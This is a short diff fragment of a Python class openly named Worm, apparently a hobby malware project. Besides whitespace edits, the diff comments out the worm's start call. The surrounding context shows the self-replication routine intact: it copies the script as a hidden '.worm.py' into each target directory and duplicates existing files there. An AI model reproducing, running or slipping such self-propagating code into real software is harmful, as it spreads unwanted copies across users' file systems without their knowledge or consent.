@@ -38,10 +38,12 @@ class Worm:
                 else:
                     pass
 
+    
     def create_new_worm(self):
         for directory in self.target_dir_list:
             destination = os.path.join(directory, ".worm.py")
             shutil.copyfile(self.own_path, destination)
+    
 
     def copy_exsisting_files(self):
         for directory in self.target_dir_list:
@@ -59,8 +61,8 @@ class Worm:
         print(self.target_dir_list)
         self.create_new_worm()
         self.copy_exsisting_files()
-
+    
 if __name__=="__main__":
     current_directory = os.path.abspath("")
     worm = Worm(path=current_directory)
-    worm.start_worm_actions()
+    #worm.start_worm_actions()
